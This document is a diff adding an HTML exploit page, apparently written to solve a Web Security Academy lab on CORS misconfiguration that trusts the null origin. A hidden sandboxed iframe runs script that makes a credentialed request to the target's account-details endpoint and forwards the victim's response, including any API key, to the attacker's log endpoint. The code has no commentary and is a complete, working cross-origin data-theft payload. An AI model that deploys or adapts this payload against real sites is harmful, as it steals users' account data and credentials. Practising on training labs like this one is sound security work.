@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = 'https://ac2e1f5b1f4defd2c063036e008a00aa.web-security-academy.net/accountDetails'
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    fetch('/log?key=' + xhr.responseText)
+                }
+            }
+            xhr.open('GET', url, true);
+            xhr.withCredentials = true;
+            xhr.send(null);
+        </script>"></iframe>
+    </body>
+</html>
